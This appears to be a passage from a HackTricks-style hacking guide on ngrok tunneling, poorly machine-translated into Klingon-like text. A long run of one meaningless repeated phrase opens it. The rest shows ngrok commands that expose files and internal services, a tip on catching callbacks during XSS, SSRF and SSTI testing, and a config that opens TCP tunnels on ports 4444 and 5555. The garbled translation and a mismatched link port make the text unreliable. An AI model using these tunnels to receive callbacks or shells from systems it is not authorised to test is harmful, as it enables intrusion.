jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDaq jImejDaq 'e' vItlhutlh. 'e' vItlhutlh HTTP jImejDa
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

*Useful for XSS,SSRF,SSTI ...*
Directly from stdout or in the HTTP interface [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling internal HTTP service

*QaStaHvIS HTTP service*

*QaH HTTP service*
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml jatlh configuration laD

ghItlh 3 tunnels vItlhutlh:
- 2 TCP
- 1 HTTP /tmp/httpbin/ vItlhutlh static files exposition jImej.
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## vItlhutlh

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
